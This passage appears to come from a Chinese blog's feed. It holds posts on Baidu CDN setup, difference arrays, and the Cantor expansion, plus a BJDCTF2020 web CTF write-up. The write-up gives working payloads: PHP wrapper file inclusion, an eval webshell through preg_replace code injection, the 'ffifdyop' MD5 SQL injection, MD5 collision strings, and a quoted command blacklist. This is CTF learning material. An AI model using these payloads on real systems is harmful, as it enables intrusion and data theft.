        <content type="html"><![CDATA[<p>本来想国内访问coding，境外访问github的~~~<br>由于博客被coding从腾讯云的香港服务器转到了新加坡服务器，导致服务器经常抽风，不能保证国内可以稳定访问，而且加载速度超级慢，所以准备用百度云CDN加速。（用的是阿里云的域名）</p><a id="more"></a><p>首先选择接入方式，有NS和CNAME,我NS成功了一次太心急了，他服务器还没布置完我又删了。。<br>这边讲CNAME方法。</p><h2 id="CNAME"><a href="#CNAME" class="headerlink" title="CNAME"></a>CNAME</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>先输入自己的域名<br><img src="/1.jpg" alt="域名"></p><h3 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h3><p><img src="/2.jpg" alt="子域名"></p><h4 id="两种类型"><a href="#两种类型" class="headerlink" title="两种类型"></a>两种类型</h4><ul><li>A：IP地址记录，用于把域名指向一个IP地址。</li><li>CNAME：别名记录，用于把域名指向另一个域名。</li></ul><p>我选择是cname，把我的子域名指向coding的静态页面地址。</p><p><img src="/3.jpg"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p><img src="/4.jpg"></p><p>在域名服务商那边添加记录值，第一个是对整个域名添加一个TXT，第二个是对子域名设置CNAME，之后选择一个免费的套餐就行了。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><h3 id="我自己的拙见："><a href="#我自己的拙见：" class="headerlink" title="我自己的拙见："></a>我自己的拙见：</h3><ul><li>CDN的基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。</li></ul><p>总结来说：CDN加速是将你的网站内容缓存到服务商那边的缓存服务器中，然后当你对这个域名发起请求后，服务商DNS解析到他的缓存服务器，将你的网站展现给你。提前把想要的东西缓存好。</p><p>设置完成后CDN加速，点进管理网站里面最好设置如下：<br><img src="/5.jpg" alt="防止宕机"></p><p><img src="/6.jpg" alt="免费WAF干嘛不用"></p><p>不过我是静态页面，我啥都没开哈哈哈哈。</p><p>推荐：</p><p><img src="/7.jpg" alt="免费证书申请"></p><p><img src="/8.jpg" alt="HTTPS"></p><p>如果申请了证书，记得一定要开全程加密，否则会提示：</p><p><img src="/9.jpg" alt="ERR_TOOMANY_REDIRECTS"></p><p>完结，然后你就会发现你的访问地址变成了百度的缓存地址。<br>弄了我一晚上，浪费我时间！不过还好速度变得特别快~~~，<br>如果有问题欢迎私信我的Twitter或者发邮件给我。</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN加速 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDU1556-Color the ball(差分序列)</title>
      <link href="/2020/02/28/HDU1556-Color-the-ball-%E5%B7%AE%E5%88%86%E5%BA%8F%E5%88%97/"/>
      <url>/2020/02/28/HDU1556-Color-the-ball-%E5%B7%AE%E5%88%86%E5%BA%8F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<p>看到题目第一想法竟然是暴力，在我超时好多次之后。。。</p><a id="more"></a><p>差分序列真香！！</p><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><blockquote><p>设 [公式] 是一个序列，序列的差分为： [公式]<br>利用此定义，我们可以定义序列的一阶差分序列为 [公式] ，那么通过递归定义，我们可以定义二阶差分序列乃至更高阶的差分序列，而原序列可以被看做是零阶差分序列。显而易见的一点是，如果序列的通项是多项式，那么每取一阶差分多项式就降一阶。<br>然后，我们定义将序列的每个 [公式] 阶差分序列列成一行得到的表成为差分表，基本的形式如下所示：<br><br><img src="/1.svg"><br><br>p阶差分在第p行上，序列本身（零阶差分）在第0行上。<br>如果序列的通项是n的p次多项式，我们可以很容易用第二数学归纳法证得，该序列的p+1阶差分（包括更高阶的差分）都是0。</p></blockquote><p>详细内容推荐：</p><p><a href="https://zhuanlan.zhihu.com/p/37597448" target="_blank" rel="noopener">zls的日常碎碎念</a><br><br><a href="https://blog.csdn.net/wu_tongtong/article/details/79115921" target="_blank" rel="noopener">Coco_T_</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>N个气球排成一排，从左到右依次编号为1,2,3….N.每次给定2个整数a b(a &lt;&#x3D; b),lele便为骑上他的“小飞鸽”牌电动车从气球a开始到气球b依次给每个气球涂一次颜色。但是N次以后lele已经忘记了第I个气球已经涂过几次颜色了，你能帮他算出每个气球被涂过几次颜色吗？</p><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>每个测试实例第一行为一个整数N,(N &lt;&#x3D; 100000).接下来的N行，每行包括2个整数a b(1 &lt;&#x3D; a &lt;&#x3D; b &lt;&#x3D; N)。<br>当N &#x3D; 0，输入结束。</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>每个测试实例输出一行，包括N个整数，第I个数代表第I个气球总共被涂色的次数。</p><h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">3</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">3</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><p>具体自己草稿本上推一下就懂了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,a,b;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">100100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)!=EOF&amp;&amp;n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;      <span class="comment">//重置</span></span><br><span class="line">f[i]=<span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;a,&amp;b);</span><br><span class="line">f[a]+=<span class="number">1</span>;</span><br><span class="line">f[b+<span class="number">1</span>]-=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> k=f[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,f[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d"</span>,f[i]+k);</span><br><span class="line">k+=f[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>康托展开(全排列)与逆运算</title>
      <link href="/2020/02/25/%E5%BA%B7%E6%89%98%E5%B1%95%E5%BC%80-%E5%85%A8%E6%8E%92%E5%88%97-%E9%80%86%E8%BF%90%E7%AE%97/"/>
      <url>/2020/02/25/%E5%BA%B7%E6%89%98%E5%B1%95%E5%BC%80-%E5%85%A8%E6%8E%92%E5%88%97-%E9%80%86%E8%BF%90%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<p><strong>康托展开是一个全排列到一个自然数的双射，常用于构建哈希表时的空间压缩。 康托展开的实质是计算当前排列在所有由小到大全排列中的顺序，因此是可逆的。</strong></p><a id="more"></a><p>今天训练赛有一道全排列题，一开始用的是DFS，和next_permutation(全排列函数)的。结果没想到教练卡了这两个超时，同学0到9打表都能过，晕死！！！我去！</p><h2 id="康托展开"><a href="#康托展开" class="headerlink" title="康托展开"></a>康托展开</h2><p><img src="/1.png" alt="百度百科"></p><p>其中, ai为整数,并且 。<br>ai表示原数的第i位在当前未出现的元素中是排在第几个<br>既然康托展开是一个双射，那么一定可以通过康托展开值求出原排列，即可以求出n的全排列中第x大排列。</p><p><strong>康托展开逆运算</strong><br>如n&#x3D;5,x&#x3D;96时：<br>首先用96-1得到95，说明x之前有95个排列.(将此数本身减去1)用95去除4! 得到3余23，说明有3个数比第1位小，所以第一位是4.用23去除3! 得到3余5，说明有3个数比第2位小，所以是4，但是4已出现过，因此是5.用5去除2!得到2余1，类似地，这一位是3.用1去除1!得到1余0，这一位是2.最后一位只能是1.所以这个数是45321。<br>按以上方法可以得出通用的算法。</p><h2 id="逆康托展开举例"><a href="#逆康托展开举例" class="headerlink" title="逆康托展开举例"></a>逆康托展开举例</h2><p>一开始已经提过了，康托展开是一个全排列到一个自然数的双射，因此是可逆的。即对于上述例子，在给出61可以算出起排列组合为34152。由上述的计算过程可以容易的逆推回来，具体过程如下：<br>用 61 &#x2F; 4! &#x3D; 2余13，等于2,说明比第一位小的数有2个，所以首位为3。<br>拿 13 &#x2F; 3! &#x3D; 2余1，说明在剩下的中，小于第二位的数有2个，但是所以第二位为4。<br>拿 1 &#x2F; 2! &#x3D; 0余1，说明在剩下的中，小于第三位的数，所以第三位为1。<br>拿 1 &#x2F; 1! &#x3D; 1余0，说明在剩下的中，小于第四位的数有1个，所以第四位为5。<br>最后一位自然就是剩下的数2。<br>通过以上分析，所求排列组合为 34152。</p><p>举一反一(哈哈)，题目给样例：<br><code>5 10</code><br>得：<br><code>13452</code></p><h2 id="分析下，先将10-1-9："><a href="#分析下，先将10-1-9：" class="headerlink" title="分析下，先将10-1&#x3D;9："></a>分析下，先将10-1&#x3D;9：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用<span class="number">9</span>/<span class="number">4</span>!(<span class="number">24</span>) = <span class="number">0</span>余<span class="number">9</span>，意味着没有数比第一位小： <span class="number">1</span></span><br><span class="line">拿<span class="number">9</span>/<span class="number">3</span>!(<span class="number">6</span>)  = <span class="number">1</span>余<span class="number">3</span>，意味着有一位数比第二位小，但是因为<span class="number">1</span>已经用过了。所以肯定是：<span class="number">3</span></span><br><span class="line">拿<span class="number">3</span>/<span class="number">2</span>!(<span class="number">2</span>)  = <span class="number">1</span>余<span class="number">1</span>，意味着有一位数比第三位小，所以是：<span class="number">4</span></span><br><span class="line">拿<span class="number">1</span>/<span class="number">1</span>!(<span class="number">1</span>)  = <span class="number">1</span>余<span class="number">0</span>，意味着没有数比第四位小，所以是：<span class="number">5</span></span><br><span class="line">剩余<span class="number">2</span>。</span><br><span class="line">所以排列组合应该是：<span class="number">13452</span></span><br></pre></td></tr></table></figure></h2><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,sum;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> FAC[] = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">120</span>, <span class="number">720</span>, <span class="number">5040</span>, <span class="number">40320</span>, <span class="number">362880</span>&#125;;   <span class="comment">// 存放阶乘</span></span><br><span class="line"><span class="comment">//康托展开逆运算</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m)!=EOF)&#123;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v;  <span class="comment">// 存放当前可选数</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; a;  <span class="comment">// 所求排列组合</span></span><br><span class="line"><span class="keyword">int</span> x=m<span class="number">-1</span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        v.push_back(i);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">int</span> r = x % FAC[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">int</span> t = x / FAC[i<span class="number">-1</span>];</span><br><span class="line">        x = r;</span><br><span class="line">        sort(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>());<span class="comment">// 从小到大排序</span></span><br><span class="line">        a.push_back(v[t]);      <span class="comment">// 剩余数里第t+1个数为当前位</span></span><br><span class="line">        v.erase(v.<span class="built_in">begin</span>()+t);   <span class="comment">// 移除选做当前位的数</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><strong><a href="https://baike.baidu.com/item/%E5%BA%B7%E6%89%98%E5%B1%95%E5%BC%80/7968428?fr=aladdin" target="_blank" rel="noopener">借鉴百度百科</a></strong></em></p>]]></content>
      
      
      <categories>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020-web复现</title>
      <link href="/2020/02/16/BJDCTF2020-web%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/02/16/BJDCTF2020-web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/BjdsecCA/BJDCTF2020" target="_blank" rel="noopener">BJDCTF2020</a><br><strong>未完待续</strong></p><a id="more"></a><h2 id="ZJCTF，就这？"><a href="#ZJCTF，就这？" class="headerlink" title="ZJCTF，就这？"></a>ZJCTF，就这？</h2><p>看到这题名字还是很不爽的，毕竟我也是个浙江人，不过zjctf，有一说一确实。<br><br>BUU上和源题好像有点差别。<br><br>进题放出源码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">$text = $_GET[<span class="string">"text"</span>];</span></span><br><span class="line"><span class="php">$file = $_GET[<span class="string">"file"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>file_get_contents($text,’r’)&#x3D;&#x3D;&#x3D;”I have a dream”)，<br>读取$text文件内容为I have a dream,想到data:&#x2F;&#x2F;伪协议。<br>看到官方wp还可以远程读取，对不起我是弟弟。</p><p><code>?text=data://text/plain,I%20have%20a%20dream</code><br><br>绕过第一个。</p><p>第二个让我们读取next.php ，可以利用filter。<br><br><code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/convert.base64-encode/resource=next.php</code><br></p><p><strong>next.php</strong></p><p><img src="/1.jpg" alt="解码出来的图片"></p><p>出题人的指引下，看了<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">大佬</a>的一篇文章。</p><p><code>next.php?\S*=${phpinfo()}</code><br>可以用,poc直接打。</p><p><code>next.php?\S*=${eval($_POST[cmd])}</code></p><p>连上木马后找到flag</p><h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h2><p><strong>我注入真菜</strong></p><p>F12 看到有个<br><br>hint:  <code>select * from &#39;admin&#39; where password=md5($pass,true)</code><br>得到sql语句.</p><p><a href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/" target="_blank" rel="noopener">Leet More 2010 Jailbreak writeup</a></p><p>总结: <strong>ffifdyop</strong><br>这个字符串其哈希值：276f722736c95d99e921722cf9ed621c<br><br>字符串: ‘or’6 <trash><br></p><p>select * from admin where password&#x3D;’’or’6<trash>‘<br>相当于select * from admin where password&#x3D;’’or 1  实现注入.<br></p><p>然后跳转到新页面<br><img src="/2.jpg"></p><p>审查页面元素:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = $GET[<span class="string">'a'</span>];</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure><p>赵总又来找女朋友了!</p><p>get传A和b都是0e开头就行<br><br>payload:<br><br><code>?a=s155964671a&amp;b=2120624</code><br>跳转到第三个页面.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>要求我们post三个,但是他和上面不同,上面那个是两个等号,下面是三个等号,全等.可以考虑MD5生日攻击,还有MD5不支持数组,如果你param1和param2是数组传入,则MD5等号两边都是false也成立.</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param<span class="number">1</span>=M<span class="symbol">%C9h</span><span class="symbol">%FF</span><span class="symbol">%0</span>E<span class="symbol">%E3</span><span class="symbol">%5</span>C<span class="symbol">%20</span><span class="symbol">%95</span>r<span class="symbol">%D4w</span><span class="symbol">%7</span>Br<span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%D3o</span><span class="symbol">%A7</span><span class="symbol">%B2</span><span class="symbol">%1</span>B<span class="symbol">%DCV</span><span class="symbol">%B7J</span><span class="symbol">%3</span>D<span class="symbol">%C0x</span><span class="symbol">%3</span>E<span class="symbol">%7</span>B<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%AF</span><span class="symbol">%BF</span><span class="symbol">%A2</span><span class="symbol">%00</span><span class="symbol">%A8</span><span class="symbol">%28</span>K<span class="symbol">%F3n</span><span class="symbol">%8</span>EKU<span class="symbol">%B3_Bu</span><span class="symbol">%93</span><span class="symbol">%D8Igm</span><span class="symbol">%A0</span><span class="symbol">%D1U</span><span class="symbol">%5</span>D<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%FB_</span><span class="symbol">%07</span><span class="symbol">%FE</span><span class="symbol">%A2</span>&amp;param<span class="number">2</span>=M<span class="symbol">%C9h</span><span class="symbol">%FF</span><span class="symbol">%0</span>E<span class="symbol">%E3</span><span class="symbol">%5</span>C<span class="symbol">%20</span><span class="symbol">%95</span>r<span class="symbol">%D4w</span><span class="symbol">%7</span>Br<span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%D3o</span><span class="symbol">%A7</span><span class="symbol">%B2</span><span class="symbol">%1</span>B<span class="symbol">%DCV</span><span class="symbol">%B7J</span><span class="symbol">%3</span>D<span class="symbol">%C0x</span><span class="symbol">%3</span>E<span class="symbol">%7</span>B<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%AF</span><span class="symbol">%BF</span><span class="symbol">%A2</span><span class="symbol">%02</span><span class="symbol">%A8</span><span class="symbol">%28</span>K<span class="symbol">%F3n</span><span class="symbol">%8</span>EKU<span class="symbol">%B3_Bu</span><span class="symbol">%93</span><span class="symbol">%D8Igm</span><span class="symbol">%A0</span><span class="symbol">%D1</span><span class="symbol">%D5</span><span class="symbol">%5</span>D<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%FB_</span><span class="symbol">%07</span><span class="symbol">%FE</span><span class="symbol">%A2</span></span><br></pre></td></tr></table></figure><p>或者直接数组传入就行param1[]&#x3D;1,param2[]&#x3D;2</p><p><a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="noopener">参考网址</a></p><p>postman的话,我这边要改成raw格式才能撞进去,我去!!注意格式问题.</p><p><a href="https://www.suk1.top/" target="_blank" rel="noopener">感谢晓黑</a></p><h2 id="中出一个安洵杯-easy-web"><a href="#中出一个安洵杯-easy-web" class="headerlink" title="中出一个安洵杯 easy_web"></a>中出一个安洵杯 easy_web</h2><p><strong>被晓黑老哥安利了下easy_web，题型差不多正好做一下。</strong></p><p>查看元素，发现题面就img，发现下面有一行<code>md5 is funny ~</code>，然后就下意识得看了下url：<br><br><code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code><br>猜测img后面跟的是文件名，cmd应该是后期要执行的命令，然后我去试了下hex,解不开，然后base64也没解开，然后有点困就去睡觉了。。。。<br>早上醒过来，越想越不应该，不可能解不开，然后果然忘记补等号了原先是27位，不能能被整除，奶奶的。两层base64接开后，再用hex，得到555.png</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TX<span class="function"><span class="title">pVek5UTTFNbVUzTURabE5qYz0</span>-&gt;</span>M<span class="function"><span class="title">zUzNTM1MmU3MDZlNjc</span>=-&gt;</span><span class="number">3535352</span><span class="function"><span class="title">e706e67</span>-&gt;</span><span class="number">555</span>.png</span><br><span class="line">反过来</span><br><span class="line"><span class="function"><span class="title">index</span>.php-&gt;</span><span class="number">696</span><span class="function"><span class="title">e6465782e706870</span>-&gt;</span>N<span class="function"><span class="title">jk2ZTY0NjU3ODJlNzA2ODcw</span>-&gt;</span>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></figure><p><code>http://16e5095c-d64f-49f0-a553-ef6564d69eea.node3.buuoj.cn/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</code><br></p><p>然后就会得到一传base64加密得index.php<br></p><p><code>data:image/gif;base64,PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2Ugew